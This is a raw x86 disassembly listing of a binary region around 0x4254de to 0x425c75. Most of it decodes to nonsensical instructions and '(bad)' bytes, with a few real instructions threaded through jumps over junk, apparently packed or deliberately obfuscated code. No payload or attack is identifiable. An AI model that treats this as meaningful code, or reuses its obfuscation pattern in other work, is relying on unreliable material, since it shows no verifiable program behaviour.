  4254de:	bound  edx,QWORD PTR [edi+0x30]
  4254e1:	out    0x46,eax
  4254e3:	sar    DWORD PTR gs:0xfcccab0,1
  4254ea:	xor    bh,BYTE PTR [eax-0x656f7221]
  4254f0:	dec    edx
  4254f1:	mov    bh,0x6
  4254f3:	mov    esi,0x411c9c18
  4254f8:	or     al,al
  4254fa:	into   
  4254fb:	pop    ecx
  4254fc:	fwait
  4254fd:	mov    edi,0x367c9469
  425502:	push   eax
  425503:	pop    ebx
  425504:	mov    edi,0xe940f096
  425509:	adc    DWORD PTR ds:0x5ce8e96a,esp
  42550f:	lods   al,BYTE PTR ds:[esi]
  425510:	xchg   ecx,eax
  425511:	pop    ebp
  425512:	or     ah,ah
  425514:	push   esp
  425515:	sti    
  425516:	xchg   BYTE PTR [edx],bh
  425518:	pop    ebx
  425519:	push   es
  42551a:	inc    edi
  42551b:	ss add al,0x75
  42551e:	or     eax,0x4e3eb46
  425523:	pop    es
  425524:	pusha  
  425525:	adc    al,0xee
  425527:	and    esi,DWORD PTR [ebx+0x1ec33b27]
  42552d:	call   0x8c99:0xcdc2ee0e
  425534:	mov    ?,WORD PTR [edx]
  425536:	das    
  425537:	jl     0x4254c4
  425539:	mov    esp,0xb7f81d1c
  42553e:	stos   BYTE PTR es:[edi],al
  42553f:	fldcw  WORD PTR [edx+0x69b2d22d]
  425545:	mov    esp,0xb33edb32
  42554a:	iret   
  42554b:	fwait
  42554c:	lods   eax,DWORD PTR ds:[esi]
  42554d:	outs   dx,BYTE PTR ds:[esi]
  42554e:	or     BYTE PTR [esi-0x4],0x3c
  425552:	sbb    ebx,DWORD PTR [edx+0x3f]
  425555:	and    eax,0x708d041c
  42555a:	pop    edi
  42555b:	rcl    DWORD PTR [esi],1
  42555d:	cmp    al,0x7
  42555f:	pop    eax
  425560:	test   eax,0xb01e45d6
  425565:	cmp    cl,BYTE PTR [eax-0x1097c1b0]
  42556b:	adc    eax,0x44e36e96
  425570:	jg     0x4255ea
  425572:	out    dx,al
  425573:	xor    DWORD PTR [ebx-0x3f16f7a3],ecx
  425579:	add    BYTE PTR [eax],al
  42557b:	add    BYTE PTR [ebx+0x479305d1],dl
  425581:	xlat   BYTE PTR ds:[ebx]
  425582:	xchg   edi,eax
  425583:	rcr    DWORD PTR [ecx-0x481b2d48],1
  425589:	dec    ecx
  42558a:	pop    ebp
  42558b:	mov    edi,0x1b8cc
  425590:	test   al,0x0
  425592:	add    BYTE PTR [eax],al
  425594:	retf   
  425595:	lea    eax,[edx+0xb]
  425598:	mov    DWORD PTR [eax],edi
  42559a:	mov    esp,0xbf952052
  42559f:	lahf   
  4255a0:	clc    
  4255a1:	or     DWORD PTR [edx+edx*4],edi
  4255a4:	mov    dl,0x37
  4255a6:	xchg   ebp,eax
  4255a7:	or     ah,BYTE PTR [edi]
  4255a9:	mov    dl,0x36
  4255ab:	fidiv  WORD PTR [ebp+0x21511062]
  4255b1:	mov    bh,0xf
  4255b3:	fmul   DWORD PTR [esp+eax*1]
  4255b6:	mov    bl,0x12
  4255b8:	call   0xd1e0fb1e
  4255bd:	sbb    ah,ch
  4255bf:	dec    eax
  4255c0:	lock mov es,WORD PTR [edi-0x65]
  4255c4:	lds    eax,FWORD PTR [edx]
  4255c6:	xlat   BYTE PTR ds:[ebx]
  4255c7:	loopne 0x4255ab
  4255c9:	and    edi,DWORD PTR [esi-0x23]
  4255cc:	mov    bh,0xe2
  4255ce:	enter  0xf88,0x6c
  4255d2:	pop    es
  4255d3:	jae    0x4255f0
  4255d5:	ss int 0x48
  4255d8:	int    0x7
  4255da:	fucom  st(6)
  4255dc:	pop    es
  4255dd:	cmp    al,0xdb
  4255df:	and    eax,0x1920ce9e
  4255e4:	dec    edi
  4255e5:	stos   BYTE PTR es:[edi],al
  4255e6:	rep stos BYTE PTR es:[edi],al
  4255e8:	cdq    
  4255e9:	sti    
  4255ea:	mov    eax,ds:0xf4216a30
  4255ef:	push   edx
  4255f0:	and    al,0x8e
  4255f2:	and    BYTE PTR [edi+ebx*8+0x72],ah
  4255f6:	adc    ah,BYTE PTR [bp+di+0x37d2]
  4255fb:	ret    0x70d9
  4255fe:	xchg   edi,eax
  4255ff:	pop    esp
  425600:	jmp    FWORD PTR [edx+0x5ba1bbc6]
  425606:	call   0x5ca7287e
  42560b:	pushf  
  42560c:	mov    ecx,0xeac59579
  425611:	mov    esi,0xfca6d478
  425616:	cmp    al,0xd7
  425618:	call   0x1a81:0x9007f325
  42561f:	fcmovbe st,st(1)
  425621:	test   al,dl
  425623:	push   0xffffff99
  425625:	sub    DWORD PTR [esi-0x9],ebx
  425628:	lods   al,BYTE PTR ds:[esi]
  425629:	dec    eax
  42562a:	mov    eax,ds:0x479883ff
  42562f:	mov    esp,0xeff744c
  425634:	add    esp,DWORD PTR [ecx+edi*1-0x4edf85a7]
  42563b:	push   eax
  42563c:	or     al,0x99
  42563e:	imul   dl
  425640:	mov    edx,DWORD PTR [ebp-0x20]
  425643:	add    al,0x6
  425645:	jmp    0x42570a
  42564a:	scas   al,BYTE PTR es:[edi]
  42564b:	cmp    cl,BYTE PTR [ecx]
  42564d:	scas   eax,DWORD PTR es:[edi]
  42564e:	popf   
  42564f:	mov    edi,0x89973bae
  425654:	stc    
  425655:	lahf   
  425656:	adc    eax,0x744e7cd3
  42565b:	mov    ecx,0xa80001
  425660:	add    BYTE PTR [eax],al
  425662:	test   DWORD PTR [ebx+ebx*1],ecx
  425665:	and    DWORD PTR [ebp-0x7fe18549],edx
  42566b:	and    al,0xca
  42566d:	cmp    ecx,DWORD PTR [edx-0x79]
  425670:	jmp    0x425610
  425672:	cmp    edx,0xffffff84
  425675:	jecxz  0x4256c7
  425677:	pop    eax
  425678:	inc    si
  42567a:	out    dx,al
  42567b:	imul   esp,DWORD PTR [eax],0x47be5941
  425681:	push   0xb17bc4c5
  425686:	nop
  425687:	adc    ah,BYTE PTR [edx-0x16]
  42568a:	inc    ecx
  42568b:	sbb    BYTE PTR [eax],0x78
  42568e:	les    ebx,FWORD PTR [edx+0x26]
  425691:	jge    0x42564c
  425693:	ss sti 
  425695:	sbb    al,0x63
  425697:	test   eax,0x4d0f42f5
  42569c:	loope  0x4256f3
  42569e:	jb     0x425675
  4256a0:	adc    eax,0x3b31ea4c
  4256a5:	xlat   BYTE PTR ds:[ebx]
  4256a6:	inc    ebx
  4256a7:	jae    0x425698
  4256a9:	dec    ebp
  4256aa:	adc    DWORD PTR [edi],esp
  4256ac:	lock cli 
  4256ae:	rcl    DWORD PTR [ebx],1
  4256b0:	sbb    ecx,DWORD PTR [ebx+0x59]
  4256b3:	mov    al,0x1e
  4256b5:	in     al,dx
  4256b6:	or     ebp,ecx
  4256b8:	mov    DWORD PTR [edi],0x222b8b83
  4256be:	mov    dh,BYTE PTR [ebp-0x3f]
  4256c1:	aaa    
  4256c2:	outs   dx,BYTE PTR ds:[esi]
  4256c3:	xor    al,0xe6
  4256c5:	dec    eax
  4256c6:	cmp    DWORD PTR [edi-0x68],ebp
  4256c9:	outs   dx,DWORD PTR ds:[esi]
  4256ca:	dec    esp
  4256cb:	and    al,0xe5
  4256cd:	inc    ebx
  4256ce:	xchg   ebx,eax
  4256cf:	or     DWORD PTR [edx-0x7b],edx
  4256d2:	mov    bh,0x3b
  4256d4:	fdiv   st(6),st
  4256d6:	xor    al,0x94
  4256d8:	daa    
  4256d9:	pop    edi
  4256da:	sbb    cl,al
  4256dc:	loop   0x425721
  4256de:	mov    DWORD PTR [esi+0x72],esi
  4256e1:	add    al,BYTE PTR [edx-0x5cf34516]
  4256e7:	or     ah,ah
  4256e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256ea:	fsub   st,st(2)
  4256ec:	test   eax,0x29858c68
  4256f1:	xchg   ebx,eax
  4256f2:	fdivr  st(4),st
  4256f4:	int    0x61
  4256f6:	and    eax,0x13064694
  4256fb:	fstp   QWORD PTR [edx-0x48]
  4256fe:	or     DWORD PTR [edx],0xffffffb8
  425701:	push   cs
  425702:	adc    BYTE PTR [edx+0x3a],ah
  425705:	dec    ebx
  425706:	jns    0x425730
  425708:	push   edx
  425709:	js     0x42573f
  42570b:	or     al,0x2
  42570d:	inc    ebp
  42570e:	or     al,0x88
  425710:	add    al,0x1a
  425712:	mov    ebx,DWORD PTR [ebp-0x30]
  425715:	mov    eax,DWORD PTR [ebp-0x34]
  425718:	jmp    0x4257dd
  42571d:	mov    al,0x6a
  42571f:	xchg   edi,eax
  425720:	add    edi,ebx
  425722:	std    
  425723:	mov    dh,0xfb
  425725:	stos   BYTE PTR es:[edi],al
  425726:	xchg   edx,eax
  425727:	xchg   ebx,eax
  425728:	sbb    al,0xa4
  42572a:	stos   DWORD PTR es:[edi],eax
  42572b:	or     bh,BYTE PTR [edi]
  42572d:	sbb    al,0xba
  42572f:	add    DWORD PTR [eax],eax
  425731:	test   al,0x0
  425733:	add    BYTE PTR [eax],al
  425735:	mov    BYTE PTR [ecx+ebp*1+0x1e],bh
  425739:	(bad)  
  42573a:	stc    
  42573b:	dec    edi
  42573c:	and    eax,0x71e4156a
  425741:	push   esp
  425742:	fiadd  DWORD PTR [eax-0x30]
  425745:	add    ah,BYTE PTR [ecx+0x32]
  425748:	jnp    0x4257a1
  42574a:	(bad)  
  42574b:	fistp  WORD PTR [edi-0xf6c9743]
  425751:	js     0x425773
  425753:	sub    DWORD PTR [ebp-0x2ba06bc0],0xffffff99
  42575a:	or     eax,0x2a9f6499
  42575f:	neg    BYTE PTR [edx+ecx*2-0x52]
  425763:	push   ebx
  425764:	adc    eax,0xc6fe2bb3
  425769:	xchg   DWORD PTR [ebp-0xd],edx
  42576c:	test   BYTE PTR [ebp-0x19d937c7],0xc2
  425773:	int    0x74
  425775:	mov    eax,0xe0bcfdca
  42577a:	adc    cl,ah
  42577c:	je     0x425754
  42577e:	push   eax
  42577f:	pop    ebx
  425780:	mov    al,ds:0x89925997
  425785:	mov    WORD PTR [ebp+0x59],ss
  425788:	mov    dh,BYTE PTR [edi]
  42578a:	mov    bl,bh
  42578c:	mov    ebp,0x96605446
  425791:	and    DWORD PTR [edx+0x3d],0xffffffd1
  425795:	jge    0x425770
  425797:	mov    ecx,eax
  425799:	adc    al,0x10
  42579b:	cmp    ah,BYTE PTR [esi+0x50a7f25d]
  4257a1:	fnstenv [edi+0x3c]
  4257a4:	add    DWORD PTR [eax+0x2cc4edbb],esp
  4257aa:	add    DWORD PTR [ecx-0x5f],esi
  4257ad:	jmp    0x5212:0xc71cfa6e
  4257b4:	ret    
  4257b5:	out    0xa,eax
  4257b7:	or     eax,0xb02ef003
  4257bc:	adc    edi,DWORD PTR [edi]
  4257be:	call   0xd7897c8e
  4257c3:	push   esi
  4257c4:	in     al,0x84
  4257c6:	int    0x55
  4257c8:	mov    ebp,0xd395f9c9
  4257cd:	mov    BYTE PTR fs:[ecx],bh
  4257d0:	nop
  4257d1:	int    0x44
  4257d3:	repnz repz xor ax,0x2e3d
  4257d9:	mov    WORD PTR [ebp+0x4d],ds
  4257dc:	cli    
  4257dd:	xor    edx,edx
  4257df:	div    ebx
  4257e1:	mov    edx,DWORD PTR [ebp-0x38]
  4257e4:	jmp    0x4258a9
  4257e9:	sub    edx,ebp
  4257eb:	mov    cl,0x97
  4257ed:	push   edi
  4257ef:	das    
  4257f0:	std    
  4257f1:	ins    BYTE PTR es:[edi],dx
  4257f2:	ret    
  4257f3:	div    BYTE PTR [ebx]
  4257f5:	data16 jo 0x425862
  4257f8:	jo     0x4257be
  4257fa:	mov    edx,0xa80001
  4257ff:	add    BYTE PTR [eax],al
  425801:	pop    edx
  425802:	jle    0x4257a8
  425804:	loope  0x425790
  425806:	aam    0x1
  425808:	jnp    0x42578b
  42580a:	inc    edx
  42580b:	lock mov ebp,0x5a548cc3
  425811:	fwait
  425812:	bnd jg 0x425808
  425815:	shr    ah,cl
  425817:	ffree  st(3)
  425819:	inc    ebx
  42581a:	mov    al,0xba
  42581c:	shr    BYTE PTR [edi+eiz*1-0x21],cl
  425820:	push   ebx
  425821:	and    al,0xbb
  425823:	lahf   
  425824:	sub    al,0x42
  425826:	sub    esi,esi
  425828:	mov    al,ds:0x6111ed01
  42582d:	(bad)  
  42582e:	cld    
  42582f:	cmc    
  425830:	inc    ebp
  425831:	iret   
  425832:	mov    WORD PTR [ebx-0x7c7085f9],ds
  425838:	in     eax,dx
  425839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42583a:	mov    al,0xb9
  42583c:	and    DWORD PTR [ecx],esp
  42583e:	mov    bh,0xa0
  425840:	add    al,0x9
  425842:	pushf  
  425843:	sbb    edx,ecx
  425845:	into   
  425846:	in     eax,dx
  425847:	in     eax,dx
  425848:	jbe    0x42583f
  42584a:	add    ch,BYTE PTR [edx-0x53b5ddfb]
  425850:	pop    edx
  425851:	dec    ecx
  425852:	pop    eax
  425853:	jo     0x425894
  425855:	lds    ebp,FWORD PTR [esi+0x3735a388]
  42585b:	cmp    eax,0x95dd2e84
  425860:	dec    ebp
  425861:	outs   dx,BYTE PTR ds:[esi]
  425862:	push   esp
  425863:	ret    
  425864:	xchg   edi,eax
  425865:	test   eax,0xbf5814f9
  42586a:	scas   al,BYTE PTR es:[edi]
  42586b:	mov    esi,0x7347bc8e
  425870:	dec    eax
  425871:	jae    0x425855
  425873:	shl    ah,1
  425875:	cmp    ebx,DWORD PTR [ebx]
  425877:	enter  0xc705,0xf4
  42587b:	cwde   
  42587c:	lea    eax,[edi+0x59]
  42587f:	ja     0x425815
  425881:	jl     0x4258e2
  425883:	sti    
  425884:	pop    esi
  425885:	(bad)  
  425886:	xchg   edx,eax
  425887:	dec    ebp
  425888:	ret    
  425889:	sahf   
  42588a:	jmp    0x1d99:0x409a63ee
  425891:	add    esi,DWORD PTR [edi+0x42]
  425894:	inc    ecx
  425895:	and    ebp,DWORD PTR [edx]
  425897:	mov    ch,0x90
  425899:	push   ebx
  42589a:	cmc    
  42589b:	sub    ah,BYTE PTR [edx-0x52]
  42589e:	dec    eax
  42589f:	jl     0x42590d
  4258a1:	enter  0x34fb,0xcb
  4258a5:	cld    
  4258a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258a7:	ret    
  4258a8:	mov    bh,0x35
  4258aa:	jmp    0x2342590d
  4258af:	ret    0x1135
  4258b2:	adc    BYTE PTR [eax],al
  4258b4:	add    BYTE PTR [ebx],al
  4258b6:	enter  0x458b,0xfc
  4258ba:	mov    edx,DWORD PTR [ebp-0x8]
  4258bd:	imul   eax,eax,0x398b
  4258c3:	mov    ebx,DWORD PTR [ebp-0xc]
  4258c6:	sub    eax,edx
  4258c8:	add    eax,0x721e
  4258cd:	xor    edx,edx
  4258cf:	div    ebx
  4258d1:	mov    edx,0x5a11
  4258d6:	jmp    0x42599b
  4258db:	mov    al,0x10
  4258dd:	fcom   QWORD PTR [ebx+0x33ffdffc]
  4258e3:	or     dl,0xc3
  4258e6:	lahf   
  4258e7:	mov    eax,0x6c9fd663
  4258ec:	mov    ebx,0xa80001
  4258f1:	add    BYTE PTR [eax],al
  4258f3:	in     al,dx
  4258f4:	dec    eax
  4258f5:	in     eax,dx
  4258f6:	je     0x4258f3
  4258f8:	pop    ss
  4258f9:	push   ss
  4258fa:	pop    esp
  4258fb:	das    
  4258fc:	fprem1 
  4258fe:	sub    al,BYTE PTR [esi-0x1]
  425901:	pop    ebp
  425902:	dec    edi
  425903:	pop    ebx
  425904:	stc    
  425905:	fidivr WORD PTR [ecx+0x5d]
  425908:	out    0xfa,al
  42590a:	mov    bh,0x41
  42590c:	pop    esi
  42590d:	stc    
  42590e:	test   al,0x9
  425910:	popf   
  425911:	jne    0x42594b
  425913:	int3   
  425914:	bound  eax,QWORD PTR [edx-0x74]
  425917:	inc    ebp
  425918:	icebp  
  425919:	outs   dx,BYTE PTR ds:[esi]
  42591a:	inc    esp
  42591b:	xchg   ecx,eax
  42591c:	mov    dh,BYTE PTR [esi]
  42591e:	loop   0x425970
  425920:	adc    ebx,ecx
  425922:	fcmovbe st,st(1)
  425924:	sub    eax,DWORD PTR [ecx-0x4e]
  425927:	and    ecx,0xffffff90
  42592a:	cmp    dl,BYTE PTR [ebx]
  42592c:	pop    esp
  42592d:	fimul  DWORD PTR [ebp-0x79]
  425930:	cwde   
  425931:	sbb    cl,BYTE PTR [eax-0x60e253dd]
  425937:	aad    0x47
  425939:	xchg   esi,eax
  42593a:	jb     0x42593b
  42593c:	adc    eax,0x2ee77fd4
  425941:	ja     0x4259ae
  425943:	pop    esp
  425944:	bound  edi,QWORD PTR [edx+0x36]
  425947:	push   ss
  425948:	stos   BYTE PTR es:[edi],al
  425949:	mov    bh,0x3
  42594b:	mov    ds:0xdd32a943,eax
  425950:	in     eax,0x18
  425952:	scas   eax,DWORD PTR es:[edi]
  425953:	out    dx,al
  425954:	adc    ah,BYTE PTR [ebp+0x5e]
  425957:	pop    edx
  425958:	mul    BYTE PTR [ecx]
  42595a:	xor    esi,DWORD PTR [ebx+0x61]
  42595d:	stos   DWORD PTR es:[edi],eax
  42595e:	mov    WORD PTR [edi+0x3ac4b436],ds
  425964:	test   eax,0x9c906b65
  425969:	ds int 0x13
  42596c:	sub    eax,0x726f480e
  425971:	fcom   DWORD PTR [esi+0x3551a5ff]
  425977:	sbb    DWORD PTR [edi+0x36],esi
  42597a:	mov    dh,0xff
  42597c:	sbb    dh,BYTE PTR [esi+0x4d1cec92]
  425982:	push   ds
  425983:	xchg   edi,eax
  425984:	mov    gs,WORD PTR [ecx+eiz*1+0x27]
  425988:	pop    eax
  425989:	adc    eax,0xd4a70ab4
  42598e:	inc    esi
  42598f:	outs   dx,BYTE PTR ds:[esi]
  425990:	pop    esp
  425991:	xchg   BYTE PTR [esi+0x430d304a],cl
  425997:	mov    bh,0x29
  425999:	(bad)  
  42599b:	sub    edx,eax
  42599d:	mov    eax,DWORD PTR [ebp-0x10]
  4259a0:	mov    ebx,DWORD PTR [ebp-0x14]
  4259a3:	jmp    0x425a68
  4259a8:	retf   0x79b4
  4259ab:	dec    edi
  4259ac:	jg     0x42597d
  4259ae:	(bad)  
  4259af:	mov    ch,0x34
  4259b1:	dec    ebp
  4259b2:	pop    esp
  4259b3:	adc    DWORD PTR [ebx+eiz*1],edi
  4259b6:	mov    dl,0x2
  4259b8:	adc    al,0xbc
  4259ba:	add    DWORD PTR [eax],eax
  4259bc:	test   al,0x0
  4259be:	add    BYTE PTR [eax],al
  4259c0:	cmp    eax,DWORD PTR [edx+0x1e]
  4259c3:	retf   0xc38d
  4259c6:	mov    ebx,0x850ef5b8
  4259cb:	xlat   BYTE PTR ds:[ebx]
  4259cc:	stc    
  4259cd:	sbb    ebp,DWORD PTR [esi]
  4259cf:	cmp    eax,0xdcf6ea7c
  4259d4:	es add cl,ah
  4259d7:	lock mov esi,0xf294162
  4259dd:	xor    eax,0x700cb238
  4259e2:	mov    ?,WORD PTR [ecx]
  4259e4:	mov    edx,0xcdecabc4
  4259e9:	std    
  4259ea:	fidivr DWORD PTR [esi-0x52f63ebf]
  4259f0:	mov    DWORD PTR [edx+0x30fe34b4],edx
  4259f6:	sub    ch,ch
  4259f8:	loope  0x4259f6
  4259fa:	sbb    bh,BYTE PTR [edi+0x426a0592]
  425a00:	push   ebx
  425a01:	pop    edi
  425a02:	sbb    DWORD PTR [ebx-0x74],edi
  425a05:	sub    BYTE PTR [ebx+0x192ecd29],cl
  425a0b:	pop    edx
  425a0c:	retf   
  425a0d:	sbb    BYTE PTR [esi],bh
  425a0f:	add    esp,edi
  425a11:	dec    ebp
  425a12:	adc    edi,ebx
  425a14:	adc    DWORD PTR [ecx],ecx
  425a16:	leave  
  425a17:	pop    eax
  425a18:	xor    DWORD PTR [edx],ecx
  425a1a:	adc    bl,BYTE PTR [eax]
  425a1c:	sbb    eax,0xcbb636f6
  425a21:	repnz stos BYTE PTR es:[edi],al
  425a23:	(bad)  
  425a24:	fst    QWORD PTR [eax-0x62]
  425a27:	xor    DWORD PTR [esi+0x7ff49c0d],edx
  425a2d:	pusha  
  425a2e:	test   al,0x61
  425a31:	dec    esi
  425a32:	aad    0xb7
  425a34:	jp     0x425a4e
  425a36:	or     esi,DWORD PTR [edi]
  425a38:	addr16 jl 0x425a60
  425a3b:	scas   eax,DWORD PTR es:[edi]
  425a3c:	cmp    eax,0x6abf9e85
  425a41:	rcr    BYTE PTR [ebx],0x91
  425a44:	add    DWORD PTR [ebp+0x42],esp
  425a47:	dec    ecx
  425a48:	jl     0x425a2b
  425a4a:	in     eax,0xfa
  425a4c:	sub    cl,BYTE PTR ds:0x9d6134b5
  425a52:	out    dx,eax
  425a53:	jnp    0x425a25
  425a55:	mov    ch,0x26
  425a57:	adc    BYTE PTR cs:[edx],al
  425a5a:	pop    edx
  425a5b:	shl    BYTE PTR [edx],cl
  425a5d:	mov    dh,0xb6
  425a5f:	lock int 0x66
  425a62:	dec    edx
  425a63:	aaa    
  425a64:	pop    eax
  425a65:	iret   
  425a66:	cs jle 0x425a76
  425a69:	nop
  425a6a:	pusha  
  425a6b:	add    BYTE PTR [eax],al
  425a6d:	jmp    0x425b32
  425a72:	dec    ebx
  425a73:	push   esi
  425a74:	ror    ebx,cl
  425a76:	(bad)  
  425a78:	pop    ebx
  425a79:	(bad)  
  425a7a:	jnp    0x425ac4
  425a7c:	cmp    ebp,ecx
  425a7e:	add    ch,BYTE PTR [eax-0x43433c39]
  425a84:	add    DWORD PTR [eax],eax
  425a86:	test   al,0x0
  425a88:	add    BYTE PTR [eax],al
  425a8a:	repnz lods al,BYTE PTR ds:[esi]
  425a8c:	xor    bh,BYTE PTR [eax+0x373d5276]
  425a92:	mov    cl,0x5b
  425a94:	mov    dl,0xa
  425a96:	ror    ch,cl
  425a98:	nop
  425a99:	cli    
  425a9a:	scas   al,BYTE PTR es:[edi]
  425a9b:	stos   DWORD PTR es:[edi],eax
  425a9c:	xchg   edx,eax
  425a9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a9e:	push   ecx
  425a9f:	mov    BYTE PTR [esi-0x698a72ec],bl
  425aa5:	pusha  
  425aa6:	pop    edi
  425aa7:	out    0x53,al
  425aa9:	mov    dl,0x2e
  425aab:	mov    bh,0x47
  425aad:	sti    
  425aae:	xlat   BYTE PTR ds:[ebx]
  425aaf:	ja     0x425a6b
  425ab1:	out    dx,eax
  425ab2:	and    BYTE PTR [ebx-0x171cd125],ah
  425ab8:	aas    
  425ab9:	ret    0x9066
  425abc:	aas    
  425abd:	es mov ah,0x5a
  425ac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ac1:	je     0x425a65
  425ac3:	in     al,0x63
  425ac5:	js     0x425a84
  425ac7:	leave  
  425ac8:	mov    ah,0x4c
  425aca:	fs jle 0x425abb
  425acd:	sbb    esi,DWORD PTR [edx-0x7450a3ad]
  425ad3:	jno    0x425b27
  425ad5:	in     al,0x25
  425ad7:	pop    ecx
  425ad8:	inc    esp
  425ad9:	xor    eax,0xd818fd9f
  425ade:	out    0xdd,eax
  425ae0:	cmp    al,0xf4
  425ae2:	das    
  425ae3:	jbe    0x425aa8
  425ae5:	jbe    0x425a67
  425ae7:	(bad)  
  425ae9:	test   eax,0x28c6cce5
  425aee:	nop
  425aef:	sar    esp,1
  425af1:	cmp    DWORD PTR [ecx],ecx
  425af3:	imul   eax,DWORD PTR [edx-0x78],0xff98a66
  425afa:	adc    DWORD PTR [edi-0x49aa2d92],esi
  425b00:	mov    ebp,0x79c204a3
  425b05:	and    BYTE PTR [esi+edi*2+0xd],ch
  425b09:	inc    ecx
  425b0a:	sub    al,0xf0
  425b0c:	shr    BYTE PTR [esi+0x4388c4a4],cl
  425b12:	pop    edx
  425b13:	dec    ebx
  425b14:	jns    0x425a9b
  425b16:	push   cs
  425b17:	xlat   BYTE PTR ds:[ebx]
  425b18:	ins    BYTE PTR es:[edi],dx
  425b19:	and    edx,DWORD PTR [edx]
  425b1b:	out    dx,al
  425b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b1d:	dec    eax
  425b1e:	jns    0x425b47
  425b20:	sbb    bl,dh
  425b22:	and    edx,ebx
  425b24:	cwde   
  425b25:	mov    fs,WORD PTR [edi-0x4c2c4aca]
  425b2b:	cmp    ah,BYTE PTR [ecx-0x4b]
  425b2e:	jne    0x425b84
  425b30:	test   DWORD PTR [ebx+esi*1-0x7438f43d],edx
  425b37:	fldcw  WORD PTR [ebx]
  425b39:	fadd   DWORD PTR [ebx]
  425b3b:	fidivr WORD PTR [ebx]
  425b3d:	fimul  DWORD PTR [edi]
  425b3f:	xchg   BYTE PTR [eax],dl
  425b41:	idiv   bh
  425b43:	(bad)  
  425b44:	jmp    0x425c09
  425b49:	shr    DWORD PTR [edi-0x23],cl
  425b4c:	sbb    eax,0xefd3bffd
  425b51:	ins    DWORD PTR es:[edi],dx
  425b52:	xchg   edx,eax
  425b53:	xchg   esi,eax
  425b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b55:	cmp    eax,0x64702138
  425b5a:	mov    ebp,0xa80001
  425b5f:	add    BYTE PTR [eax],al
  425b61:	pop    edi
  425b62:	sub    ah,BYTE PTR [ebp-0x37]
  425b65:	out    0x16,al
  425b67:	mov    esp,0xea716070
  425b6c:	adc    ebp,DWORD PTR [ebx+edi*4+0x1f]
  425b70:	xchg   esi,eax
  425b71:	outs   dx,BYTE PTR ds:[esi]
  425b72:	adc    ah,BYTE PTR [edi+0x67a95c4f]
  425b78:	outs   dx,BYTE PTR ds:[esi]
  425b79:	mov    ebx,gs
  425b7b:	or     edi,DWORD PTR [eax]
  425b7d:	jg     0x425bac
  425b7f:	jecxz  0x425b1e
  425b81:	jb     0x425b59
  425b83:	lods   al,BYTE PTR ds:[esi]
  425b84:	push   ecx
  425b85:	aam    0x1e
  425b87:	mov    BYTE PTR [eax+0x6e],al
  425b8a:	rcl    DWORD PTR [eax],0x4f
  425b8d:	ins    BYTE PTR es:[di],dx
  425b8f:	and    ebx,edx
  425b91:	and    esp,edx
  425b93:	ins    DWORD PTR es:[edi],dx
  425b94:	cmp    esi,DWORD PTR [edx-0x24]
  425b97:	cli    
  425b98:	into   
  425b99:	scas   eax,DWORD PTR es:[edi]
  425b9a:	and    al,0x77
  425b9c:	xchg   esp,eax
  425b9d:	and    BYTE PTR [ecx+0x4e],bh
  425ba0:	add    al,0x56
  425ba2:	dec    edi
  425ba3:	bnd jl 0x425b7e
  425ba6:	outs   dx,DWORD PTR ds:[esi]
  425ba7:	icebp  
  425ba8:	sub    eax,0xadbb1ab0
  425bad:	push   ss
  425bae:	mov    cl,0x43
  425bb0:	dec    ebx
  425bb1:	mov    dh,0x2d
  425bb3:	test   eax,0x68672389
  425bb8:	mov    ebp,0xe1d5961d
  425bbd:	or     al,0x87
  425bbf:	dec    ebx
  425bc0:	and    BYTE PTR [edi],ch
  425bc2:	bound  esp,QWORD PTR [eax+eiz*4-0x6f]
  425bc6:	loopne 0x425b4c
  425bc8:	adc    al,0xde
  425bca:	cmp    ecx,DWORD PTR [edx+0x1f]
  425bcd:	pop    eax
  425bce:	lock or DWORD PTR [edi-0x1e33e7fe],eax
  425bd5:	jne    0x425b93
  425bd7:	pop    ecx
  425bd8:	fldenv [edx-0x78]
  425bdb:	xchg   ebp,eax
  425bdc:	mov    dl,0xf6
  425bde:	adc    al,0xa3
  425be0:	jge    0x425bc5
  425be2:	inc    edx
  425be3:	(bad)  
  425be4:	pop    esp
  425be5:	xchg   edi,eax
  425be6:	dec    edi
  425be7:	and    ecx,DWORD PTR [ebp+0xf]
  425bea:	sbb    BYTE PTR [edx+0x720e3274],0xaa
  425bf1:	xchg   esi,eax
  425bf2:	and    eax,0xb675433b
  425bf7:	fidivr WORD PTR [edi-0x4d]
  425bfa:	test   eax,0xf733ec8a
  425bff:	pop    esi
  425c00:	idiv   BYTE PTR [ebx+edx*4]
  425c03:	popf   
  425c04:	iret   
  425c05:	or     eax,DWORD PTR [ecx]
  425c07:	sub    bl,BYTE PTR [esi+0x5f]
  425c0a:	jmp    0x425ccf
  425c0f:	aad    0x31
  425c11:	mov    dl,0x1f
  425c13:	neg    BYTE PTR [edi-0x78250403]
  425c19:	ror    ch,cl
  425c1b:	mov    bl,0xd9
  425c1d:	lock mov ebx,0x1be0c
  425c23:	test   al,0x0
  425c25:	add    BYTE PTR [eax],al
  425c27:	push   DWORD PTR [ebx]
  425c29:	mov    edx,0x8aeda57a
  425c2e:	loopne 0x425bfc
  425c30:	cmp    dl,BYTE PTR [esi]
  425c32:	(bad)  
  425c33:	or     al,0x42
  425c35:	loopne 0x425c08
  425c37:	inc    ebp
  425c38:	and    BYTE PTR [ebx+0x5b],cl
  425c3b:	outs   dx,BYTE PTR ds:[esi]
  425c3c:	mov    ecx,0xa72ffc54
  425c41:	fcom   QWORD PTR [edx]
  425c43:	fs xor al,0x3a
  425c46:	push   ds
  425c47:	aad    0x87
  425c49:	pop    ebx
  425c4a:	nop
  425c4b:	xchg   ebx,eax
  425c4c:	(bad)  
  425c4e:	add    BYTE PTR [esi+edi*4+0x6c164743],cl
  425c55:	mov    WORD PTR [eax-0x752b751d],ss
  425c5b:	test   al,0x88
  425c5d:	jge    0x425c6a
  425c5f:	pop    esi
  425c60:	shl    ch,0xa5
  425c63:	mov    bh,0xba
  425c65:	xchg   esi,eax
  425c66:	sub    al,0x81
  425c68:	fiadd  WORD PTR [ecx+0x61]
  425c6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c6c:	jecxz  0x425c7a
  425c6e:	pop    eax
  425c6f:	sbb    dl,BYTE PTR ds:0xc7f2fddc
  425c75:	mov    al,ds:0x47261eb8
